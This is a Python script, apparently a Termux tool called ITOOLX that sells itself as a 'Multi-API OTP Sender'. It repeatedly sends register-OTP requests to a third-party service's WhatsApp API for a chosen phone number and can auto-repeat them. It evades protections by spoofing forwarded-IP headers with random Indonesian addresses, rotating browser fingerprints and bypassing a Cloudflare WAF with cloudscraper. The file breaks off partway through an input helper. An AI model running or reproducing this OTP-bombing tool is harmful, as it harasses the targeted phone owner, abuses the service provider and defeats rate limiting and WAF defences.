#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
import signal
import random
import uuid
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich import box
    from rich.rule import Rule
    from rich.text import Text
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt
    from rich.align import Align
    from rich.live import Live
    from rich import box
    from rich.rule import Rule
    from rich.text import Text

try:
    import cloudscraper
except ImportError:
    os.system("pip install cloudscraper -q")
    import cloudscraper

console = Console()

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

APIS = {
    1: {"name": "PlanetBan",   "desc": "WhatsApp",  "tag": "PLB",
        "cooldown": 60, "color": "bright_red",    "method": "planetban"},
    2: {"name": "ALL TARGETS", "desc": "Semua API", "tag": "ALL",
        "cooldown": 0,  "color": "bold cyan",      "method": "all"},
}

# ── User-Agent pool (Android + iOS, Chrome 113-130)
UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; POCO X3 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; vivo V25) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OPPO Find X6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; realme GT2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Samsung Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X6816D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Tecno KG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.163 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0.6478.153 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/125.0.6422.80 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Galaxy A73) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.40 Mobile Safari/537.36",
]

SEC_CH_BRANDS = [
    '"Not;A=Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
    '"Chromium";v="{v}","Not_A Brand";v="8","Google Chrome";v="{v}"',
    '"Google Chrome";v="{v}","Chromium";v="{v}","Not;A=Brand";v="99"',
    '"Not/A)Brand";v="8","Chromium";v="{v}","Google Chrome";v="{v}"',
    '"Android WebView";v="{v}","Chromium";v="{v}","Not;A=Brand";v="8"',
]

# Indonesian ISP IP ranges (Telkom, Indosat, XL, Tri, Biznet, CBN, dsb.)
FAKE_IPS = [
    lambda: f"36.{random.randint(64,95)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"114.{random.randint(120,130)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"180.{random.randint(240,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"103.{random.randint(1,80)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"202.{random.randint(60,80)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"118.{random.randint(96,99)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"125.{random.randint(160,165)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"182.{random.randint(1,5)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"110.{random.randint(136,143)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"139.{random.randint(194,199)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"43.{random.randint(245,252)}.{random.randint(0,255)}.{random.randint(1,254)}",
    lambda: f"120.{random.randint(188,196)}.{random.randint(0,255)}.{random.randint(1,254)}",
]

def rand_ua() -> str:
    return random.choice(UA_POOL)

def rand_ip() -> str:
    return random.choice(FAKE_IPS)()

def rand_sec_ch(ver: int = None) -> str:
    v = ver or random.choice([113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130])
    return random.choice(SEC_CH_BRANDS).replace("{v}", str(v))

# ── Banner (ASCII art, tampil di print_home)
BANNER = """\
[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗[/bold cyan]
[cyan] ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝[/cyan]
[bold blue] ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ [/bold blue]
[blue] ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ [/blue]
[bold cyan] ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗[/bold cyan]
[cyan] ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/cyan]"""

# ══════════════════════════════════════════════════════════════
#  STATE
# ══════════════════════════════════════════════════════════════

cooldown_tracker: dict = {}   # { phone: { method: sent_at } }

# ══════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════

def get_rem(phone: str, method: str, cd: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))

def set_cd(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def was_sent(phone: str, method: str) -> bool:
    return method in cooldown_tracker.get(phone, {})

def fmt_rem(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m{sc:02d}s" if m else f"{sc}s"

def is_ok(code: int) -> bool:
    return code in (200, 201, 202)

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def flush_stdin():
    try:
        import termios
        termios.tcflush(sys.stdin, termios.TCIFLUSH)
    except Exception:
        pass

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def status_fmt(code: int):
    if is_ok(code):  return "SUCCESS", "bold green"
    if code == 0:    return "ERROR",   "bold red"
    if code == 403:  return "BLOCKED", "bold red"
    if code == 429:  return "LIMIT",   "bold yellow"
    return f"HTTP {code}", "bold yellow"

def clean_exit():
    clr()
    console.print()
    console.print(Align.center(Panel(
        "[bold white]Sampai jumpa![/bold white]\n"
        "[dim cyan]ITOOLX  ·  Termux Edition[/dim cyan]",
        border_style="cyan", padding=(1, 6), box=box.DOUBLE,
    )))
    console.print()
    sys.exit(0)

# ══════════════════════════════════════════════════════════════
#  HEADERS — randomized fingerprint per-request
# ══════════════════════════════════════════════════════════════

def _h(**extra) -> dict:
    ua   = rand_ua()
    ip   = rand_ip()
    sch  = rand_sec_ch()
    plat = '"Android"' if "Android" in ua else '"iOS"' if "iPhone" in ua else '"Android"'
    base = {
        "User-Agent":         ua,
        "Accept":             "application/json, text/plain, */*",
        "Accept-Encoding":    "gzip, deflate, br",
        "Accept-Language":    random.choice([
            "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "id-ID,id;q=0.9,en;q=0.8",
            "id;q=0.9,en-US;q=0.8,en;q=0.7",
            "id-ID,id;q=1.0",
        ]),
        "Connection":         "keep-alive",
        "sec-ch-ua":          sch,
        "sec-ch-ua-mobile":   "?1",
        "sec-ch-ua-platform": plat,
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
        "X-Forwarded-For":    ip,
        "X-Real-IP":          ip,
        "X-Originating-IP":   ip,
        "CF-Connecting-IP":   ip,
    }
    base.update(extra)
    return base

# ══════════════════════════════════════════════════════════════
#  REQUEST WRAPPER — smart retry + randomized fingerprint
# ══════════════════════════════════════════════════════════════

_RATE_LIMIT_HINTS = (
    "please wait", "wait at least", "too many", "rate limit",
    "terlalu banyak", "tunggu", "cooldown", "throttle",
)

def _is_server_ratelimit(body: str) -> bool:
    b = body.lower()
    return any(h in b for h in _RATE_LIMIT_HINTS)

def safe_post(url: str, headers: dict, data=None, files=None,
              timeout: int = 15, retries: int = 3) -> dict:
    last_code = 0
    last_body = ""
    for attempt in range(retries):
        try:
            hdrs = dict(headers)
            # regenerasi fingerprint tiap attempt
            hdrs["X-Forwarded-For"]  = rand_ip()
            hdrs["X-Real-IP"]        = hdrs["X-Forwarded-For"]
            hdrs["X-Originating-IP"] = rand_ip()
            hdrs["CF-Connecting-IP"] = rand_ip()
            hdrs["User-Agent"]       = rand_ua()
            hdrs["sec-ch-ua"]        = rand_sec_ch()

            if attempt > 0:
                time.sleep(random.uniform(1.2, 3.0) * attempt)

            if files:
                r = requests.post(url, headers=hdrs, files=files, timeout=timeout)
            else:
                r = requests.post(url, headers=hdrs, data=data, timeout=timeout)

            last_code = r.status_code
            last_body = r.text

            if is_ok(r.status_code):
                return {"status": r.status_code, "body": r.text}

            if r.status_code == 429:
                wait = float(r.headers.get("Retry-After",
                             random.uniform(3, 7) * (attempt + 1)))
                time.sleep(min(wait, 15))
                continue

            if r.status_code == 403:
                if _is_server_ratelimit(r.text):
                    return {"status": r.status_code, "body": r.text}
                time.sleep(random.uniform(1.0, 2.5))
                continue

            return {"status": r.status_code, "body": r.text}

        except requests.exceptions.Timeout:
            last_code = 0
            last_body = "Timeout"
            time.sleep(1.5)
        except Exception as e:
            last_code = 0
            last_body = str(e)
            break

    return {"status": last_code, "body": last_body}

# ══════════════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════════════

# ── Cloudscraper session singleton untuk PlanetBan (bypass Cloudflare WAF)
_plb_scraper: cloudscraper.CloudScraper | None = None

def _get_plb_scraper() -> cloudscraper.CloudScraper:
    """Buat atau kembalikan cloudscraper session yang sudah solve CF challenge."""
    global _plb_scraper
    if _plb_scraper is None:
        _plb_scraper = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "android", "desktop": False}
        )
    return _plb_scraper

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]

    payload = json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"})
    last_code, last_body = 0, ""

    for attempt in range(3):
        try:
            ip  = rand_ip()
            hdrs = {
                "Content-Type":     "application/json",
                "Accept":           "application/json, text/plain, */*",
                "Accept-Language":  random.choice([
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "id-ID,id;q=0.9,en;q=0.8",
                ]),
                "origin":           "https://planetban.com",
                "referer":          "https://planetban.com/",
                "x-requested-with": "com.chimbori.hermitcrab",
                "X-Forwarded-For":  ip,
                "X-Real-IP":        ip,
                "X-Originating-IP": rand_ip(),
            }

            if attempt > 0:
                global _plb_scraper
                _plb_scraper = None        # reset session saat retry agar CF token segar
                time.sleep(random.uniform(1.5, 3.0) * attempt)

            scraper = _get_plb_scraper()
            r = scraper.post(
                "https://api.planetban.com/website/customer/request-otp",
                headers=hdrs, data=payload, timeout=20,
            )
            last_code = r.status_code
            last_body = r.text

            if is_ok(r.status_code):
                return {"status": r.status_code, "body": r.text}

            if r.status_code == 429:
                wait = float(r.headers.get("Retry-After", random.uniform(3, 7) * (attempt + 1)))
                time.sleep(min(wait, 15))
                continue

            if r.status_code == 403:
                # 403 = CF masih blokir → reset session dan coba lagi
                _plb_scraper = None
                time.sleep(random.uniform(2.0, 4.0))
                continue

            return {"status": r.status_code, "body": r.text}

        except Exception as e:
            last_code = 0
            last_body = str(e)
            _plb_scraper = None
            time.sleep(1.5)

    return {"status": last_code, "body": last_body}

def dispatch(method: str, phone: str) -> dict:
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════════════
#  UI — BANNER & MENU
# ══════════════════════════════════════════════════════════════

def _status_dot(phone: str, api: dict) -> str:
    """Titik status per API berdasarkan cooldown."""
    if api["method"] == "all":
        return ""
    rem = get_rem(phone, api["method"], api["cooldown"])
    if not was_sent(phone, api["method"]):
        return "[bold green]●[/bold green]"
    if rem > 0:
        return f"[bold red]●[/bold red] [dim]{fmt_rem(rem)}[/dim]"
    return "[bold green]●[/bold green]"

def render_menu(phone: str = "") -> Panel:
    t = Table(
        box=box.SIMPLE_HEAD, border_style="cyan",
        header_style="bold cyan", show_lines=False,
        padding=(0, 1),
    )
    t.add_column("",    width=3,  justify="right",  style="bold dim white")
    t.add_column("TAG", width=5,  justify="center")
    t.add_column("TARGET",       width=14, style="bold")
    t.add_column("VIA",          width=10, style="dim")
    t.add_column("CD",           width=5,  justify="center", style="dim")
    t.add_column("STATUS",       width=14, justify="left")

    for num, api in APIS.items():
        cd_txt  = "each" if api["method"] == "all" else f"{api['cooldown']}s"
        dot     = _status_dot(phone, api) if phone else ""
        t.add_row(
            f"[cyan]{num}[/cyan]",
            f"[{api['color']}]{api['tag']}[/{api['color']}]",
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            api["desc"],
            cd_txt,
            dot,
        )

    t.add_row(
        "[dim red]0[/dim red]",
        "[dim red]EXIT[/dim red]",
        "[dim red]Keluar[/dim red]",
        "", "", "",
    )

    phone_line = (
        f"[dim]Nomor:[/dim] [bold bright_yellow]{phone}[/bold bright_yellow]"
        if phone else "[dim]Belum ada nomor[/dim]"
    )
    return Panel(
        t,
        title="[bold cyan]◈  ITOOLX  ◈  PILIH TARGET[/bold cyan]",
        subtitle=phone_line,
        border_style="cyan",
        box=box.DOUBLE_EDGE,
        padding=(0, 1),
    )

def print_home(phone: str = ""):
    clr()
    console.print()
    console.print(Align.center(Text.from_markup(BANNER)))
    console.print(Rule(
        "[dim cyan]Multi-API OTP Sender  ·  Termux Edition[/dim cyan]",
        style="dim cyan",
    ))
    console.print()
    console.print(Align.center(render_menu(phone)))
    console.print()

# ══════════════════════════════════════════════════════════════
#  UI — RESULT PANELS
# ══════════════════════════════════════════════════════════════

def show_result(api: dict, phone: str, res: dict, round_n: int):
    clr()
    code     = res.get("status", 0)
    body     = res.get("body", "")
    prev     = body[:120].replace("\n", " ") + ("…" if len(body) > 120 else "")
    lbl, col = status_fmt(code)

    icon     = "✓" if is_ok(code) else "✗"
    border   = "green" if is_ok(code) else "red"

    body_line = f"\n  [dim]{prev}[/dim]" if prev else ""

    console.print()
    console.print(Align.center(Panel(
        f"  [{api['color']}]◈  {api['name']}  [{api['tag']}][/{api['color']}]\n"
        f"  [dim cyan]{'─'*30}[/dim cyan]\n"
        f"  [dim]Nomor [/dim] [bold bright_yellow]{phone}[/bold bright_yellow]\n"
        f"  [dim]Round [/dim] [white]{round_n}[/white]\n"
        f"  [dim]HTTP  [/dim] [{col}]{code}[/{col}]\n"
        f"  [dim]Waktu [/dim] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]"
        f"{body_line}",
        title=f"[{col}]{icon}  {lbl}[/{col}]",
        border_style=border,
        box=box.HEAVY,
        padding=(1, 3),
        width=50,
    )))
    console.print()


def show_all_results(phone: str, results: list, round_n: int):
    clr()
    t = Table(
        box=box.HEAVY_HEAD, border_style="cyan",
        header_style="bold cyan", show_lines=True,
        title=f"[bold cyan]◈  ALL TARGETS  ·  Round {round_n}  ·  {phone}[/bold cyan]",
        padding=(0, 1),
    )
    t.add_column("TAG",    width=5,  justify="center")
    t.add_column("TARGET", width=14)
    t.add_column("HTTP",   width=6,  justify="center")
    t.add_column("STATUS", width=12, justify="center")
    t.add_column("WAKTU",  width=9,  justify="center")

    for item in results:
        lbl, col = status_fmt(item["status"])
        icon     = "✓" if is_ok(item["status"]) else "✗"
        t.add_row(
            f"[{item['color']}]{item['tag']}[/{item['color']}]",
            f"[{item['color']}]{item['name']}[/{item['color']}]",
            f"[{col}]{item['status']}[/{col}]",
            f"[{col}]{icon} {lbl}[/{col}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print()
    console.print(Align.center(t))
    console.print()

# ══════════════════════════════════════════════════════════════
#  UI — R-MODE LIVE TABLE
# ══════════════════════════════════════════════════════════════

def _cd_bar(rem: int, cd: int, width: int = 12) -> str:
    if cd == 0 or rem <= 0:
        return "[bold green]" + "█" * width + "[/bold green]"
    filled = max(0, int((cd - rem) / cd * width))
    empty  = width - filled
    return (
        "[bold green]" + "█" * filled + "[/bold green]"
        + "[dim]" + "░" * empty + "[/dim]"
    )

def build_r_live(phone: str, targets: list, stats: dict,
                 last_row: dict, round_counts: dict, title: str) -> Panel:
    # ── hasil tabel
    t = Table(
        box=box.SIMPLE_HEAD, border_style="cyan",
        header_style="bold cyan", show_lines=False,
        padding=(0, 1),
    )
    t.add_column("TAG",   width=5,  justify="center")
    t.add_column("API",   width=13)
    t.add_column("RND",   width=4,  justify="center", style="dim")
    t.add_column("HTTP",  width=6,  justify="center")
    t.add_column("ST",    width=12, justify="center")
    t.add_column("OK",    width=4,  justify="center")
    t.add_column("ERR",   width=4,  justify="center")
    t.add_column("JAM",   width=9,  justify="center", style="dim")

    for api in targets:
        if api["method"] == "all":
            continue
        m    = api["method"]
        lr   = last_row.get(m, {})
        code = lr.get("status", 0)
        ts   = lr.get("time", "--:--:--")
        rn   = round_counts.get(m, 0)

        lbl, col = status_fmt(code) if rn > 0 else ("──", "dim")
        icon     = "✓" if (rn > 0 and is_ok(code)) else ("✗" if rn > 0 else "·")

        ok_c  = stats.get(m, {}).get("ok",  0)
        err_c = stats.get(m, {}).get("err", 0)

        t.add_row(
            f"[{api['color']}]{api['tag']}[/{api['color']}]",
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            str(rn) if rn > 0 else "─",
            f"[{col}]{code}[/{col}]" if rn > 0 else "[dim]─[/dim]",
            f"[{col}]{icon} {lbl}[/{col}]",
            f"[bold green]{ok_c}[/bold green]" if ok_c  else "[dim]0[/dim]",
            f"[bold red]{err_c}[/bold red]"    if err_c else "[dim]0[/dim]",
            ts,
        )

    # ── CD bar rows
    cd_t = Table(box=box.SIMPLE, show_header=False, padding=(0, 1), show_lines=False)
    cd_t.add_column("API",  width=13)
    cd_t.add_column("BAR",  width=14)
    cd_t.add_column("SISA", width=8,  justify="right")
    cd_t.add_column("ST",   width=8,  justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        cd   = api["cooldown"]
        sent = cooldown_tracker.get(phone, {}).get(api["method"])

        if rem > 0 and sent:
            bar  = _cd_bar(rem, cd)
            sisa = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            st   = "[red]WAIT[/red]"
        else:
            bar  = _cd_bar(0, cd)
            sisa = "[bold green]  READY[/bold green]"
            st   = "[green]FIRE[/green]"

        cd_t.add_row(
            f"[dim]{api['name']}[/dim]",
            bar, sisa, st,
        )

    now = datetime.now().strftime("%H:%M:%S")
    from rich.console import Group
    return Panel(
        Group(t, Rule(style="dim cyan"), cd_t),
        title=title,
        subtitle=f"[dim]{now}  ·  Ctrl+C = stop[/dim]",
        border_style="cyan",
        box=box.DOUBLE_EDGE,
        padding=(0, 1),
    )

# ══════════════════════════════════════════════════════════════
#  UI — COOLDOWN PANEL
# ══════════════════════════════════════════════════════════════

def build_cd_panel(phone: str, targets: list, title: str = "") -> Panel:
    t = Table(
        box=box.SIMPLE_HEAD, show_header=True, show_lines=False,
        padding=(0, 1), header_style="dim cyan",
    )
    t.add_column("TARGET",   width=14)
    t.add_column("PROGRESS", width=14)
    t.add_column("SISA",     width=8,  justify="right")
    t.add_column("UNLOCK",   width=9,  justify="center")
    t.add_column("STATUS",   width=8,  justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        cd   = api["cooldown"]

        if rem > 0 and sent:
            bar  = _cd_bar(rem, cd)
            sisa = f"[bold red]{fmt_rem(rem):>6}[/bold red]"
            ul   = datetime.fromtimestamp(sent + cd).strftime("%H:%M:%S")
            st   = "[red]WAIT[/red]"
        else:
            bar  = _cd_bar(0, cd)
            sisa = "[bold green]  READY[/bold green]"
            ul   = "[dim]──[/dim]"
            st   = "[bold green]READY[/bold green]"

        t.add_row(
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            bar, sisa, f"[dim]{ul}[/dim]", st,
        )

    now = datetime.now().strftime("%H:%M:%S")
    hdr = title or f"[bold yellow]⏳  COOLDOWN  ·  {phone}[/bold yellow]"
    return Panel(t, title=hdr, subtitle=f"[dim]{now}[/dim]",
                 border_style="yellow", box=box.HEAVY, padding=(0, 1))

# ══════════════════════════════════════════════════════════════
#  LIVE CD WAIT
# ══════════════════════════════════════════════════════════════

def wait_until_ready(phone: str, targets: list):
    def any_locked():
        return any(get_rem(phone, a["method"], a["cooldown"]) > 0
                   for a in targets if a["method"] != "all")

    if not any_locked():
        return

    try:
        with Live(build_cd_panel(phone, targets),
                  console=console, refresh_per_second=2,
                  transient=True) as live:
            while any_locked():
                time.sleep(0.5)
                live.update(build_cd_panel(phone, targets))
    except KeyboardInterrupt:
        raise

    flush_stdin()

# ══════════════════════════════════════════════════════════════
#  Y / R / N  PROMPT
# ══════════════════════════════════════════════════════════════

def ask_yrn(before_send: bool = False) -> str:
    flush_stdin()
    if before_send:
        content = (
            "  [bold cyan]Y[/bold cyan]  [white]Kirim sekali[/white]\n"
            "  [bold cyan]R[/bold cyan]  [white]Auto-repeat[/white]  [dim](kirim otomatis tiap CD habis)[/dim]\n"
            "  [bold red]N[/bold red]  [white]Batal, kembali ke menu[/white]"
        )
        title  = "[bold cyan]◈  PILIH MODE[/bold cyan]"
        border = "cyan"
    else:
        content = (
            "  [bold cyan]Y[/bold cyan]  [white]Kirim sekali lagi[/white]\n"
            "  [bold cyan]R[/bold cyan]  [white]Auto-repeat[/white]  [dim](otomatis)[/dim]\n"
            "  [bold red]N[/bold red]  [white]Stop, kembali ke menu[/white]"
        )
        title  = "[bold green]◈  LANJUT?[/bold green]"
        border = "green"

    console.print(Align.center(Panel(
        content, title=title, border_style=border,
        box=box.HEAVY, padding=(0, 3), width=54,
    )))
    while True:
        try:
            flush_stdin()
            raw = Prompt.ask("[bold cyan]  >[/bold cyan]", default="y").strip().lower()
            if raw in ("y", "r", "n"):
                return raw
        except (KeyboardInterrupt, EOFError):
            return "n"

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_single(api: dict, phone: str, first_ans: str):
    round_n = 0

    if first_ans == "r":
        try:
            session_single_r(api, phone, round_n)
        except KeyboardInterrupt:
            pass
        return

    try:
        while True:
            round_n += 1
            with console.status(
                f"[bold cyan]  ⟳  Mengirim  {api['name']}...[/bold cyan]",
                spinner="dots12",
            ):
                res = dispatch(api["method"], phone)
            set_cd(phone, api["method"])

            show_result(api, phone, res, round_n)
            wait_until_ready(phone, [api])

            ans = ask_yrn(before_send=False)
            if ans == "n":
                return
            if ans == "r":
                session_single_r(api, phone, round_n)
                return
    except KeyboardInterrupt:
        pass

# ══════════════════════════════════════════════════════════════
#  SESSION — SINGLE  (R mode)
# ══════════════════════════════════════════════════════════════

def session_single_r(api: dict, phone: str, start_round: int):
    targets      = [api]
    round_counts = {api["method"]: start_round}
    stats        = {api["method"]: {"ok": 0, "err": 0}}
    last_row     = {}
    title        = f"[bold yellow]⟳  AUTO-REPEAT  {api['tag']}  ·  {phone}[/bold yellow]"

    try:
        with Live(console=console, refresh_per_second=4, transient=True) as live:
            while True:
                rn = round_counts[api["method"]] + 1
                round_counts[api["method"]] = rn

                live.stop()
                with console.status(
                    f"[bold cyan]  ⟳  Auto  {api['name']}  #{rn}...[/bold cyan]",
                    spinner="dots12",
                ):
                    res = dispatch(api["method"], phone)
                set_cd(phone, api["method"])
                live.start()

                code = res.get("status", 0)
                if is_ok(code):
                    stats[api["method"]]["ok"]  += 1
                else:
                    stats[api["method"]]["err"] += 1

                last_row[api["method"]] = {
                    "status": code,
                    "time":   datetime.now().strftime("%H:%M:%S"),
                }
                live.update(build_r_live(phone, targets, stats,
                                         last_row, round_counts, title))

                while get_rem(phone, api["method"], api["cooldown"]) > 0:
                    time.sleep(0.25)
                    live.update(build_r_live(phone, targets, stats,
                                             last_row, round_counts, title))
    except KeyboardInterrupt:
        pass

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (Y mode)
# ══════════════════════════════════════════════════════════════

def session_all(phone: str, first_ans: str):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    round_n = 0

    if first_ans == "r":
        try:
            session_all_r(phone, targets, round_n)
        except KeyboardInterrupt:
            pass
        return

    try:
        while True:
            round_n += 1
            results = []
            for api in targets:
                with console.status(
                    f"[bold cyan]  ⟳  {api['name']}...[/bold cyan]",
                    spinner="aesthetic",
                ):
                    t_str = datetime.now().strftime("%H:%M:%S")
                    res   = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                results.append({
                    "name":   api["name"], "tag": api["tag"],
                    "color":  api["color"],
                    "status": res.get("status", 0), "time": t_str,
                })
                time.sleep(0.15)

            show_all_results(phone, results, round_n)
            wait_until_ready(phone, targets)

            ans = ask_yrn(before_send=False)
            if ans == "n":
                return
            if ans == "r":
                session_all_r(phone, targets, round_n)
                return
    except KeyboardInterrupt:
        pass

# ══════════════════════════════════════════════════════════════
#  SESSION — ALL  (R mode)
# ══════════════════════════════════════════════════════════════

def session_all_r(phone: str, targets: list, initial_round: int = 0):
    round_counts = {a["method"]: initial_round for a in targets}
    stats        = {a["method"]: {"ok": 0, "err": 0} for a in targets}
    last_row     = {}
    pending: set = {a["method"] for a in targets
                    if not was_sent(phone, a["method"])}
    title = f"[bold yellow]⟳  AUTO-REPEAT  ALL  ·  {phone}[/bold yellow]"

    def needs_send(api: dict) -> bool:
        if api["method"] in pending:
            return True
        return (was_sent(phone, api["method"]) and
                get_rem(phone, api["method"], api["cooldown"]) == 0)

    with Live(console=console, refresh_per_second=4, transient=True) as live:
        while True:
            ready = [a for a in targets if needs_send(a)]

            if ready:
                for api in ready:
                    pending.discard(api["method"])
                    round_counts[api["method"]] += 1
                    rn = round_counts[api["method"]]

                    live.stop()
                    with console.status(
                        f"[bold cyan]  ⟳  {api['name']}  #{rn}[/bold cyan]",
                        spinner="dots12",
                    ):
                        res = dispatch(api["method"], phone)
                    set_cd(phone, api["method"])
                    live.start()

                    code = res.get("status", 0)
                    if is_ok(code):
                        stats[api["method"]]["ok"]  += 1
                    else:
                        stats[api["method"]]["err"] += 1

                    last_row[api["method"]] = {
                        "status": code,
                        "time":   datetime.now().strftime("%H:%M:%S"),
                    }
                    time.sleep(0.1)

            live.update(build_r_live(phone, targets, stats,
                                     last_row, round_counts, title))
            time.sleep(0.25)

# ══════════════════════════════════════════════════════════════
#  INPUT HELPER
# ══════════════════════════════════════════════════════════════

def ask_phone(current: str = "") -> str:
    hint = (f" [dim](Enter = {current})[/dim]"
            if current else " [dim](08xxx / 628xxx)[/dim]")
    while True:
        flush_stdin()
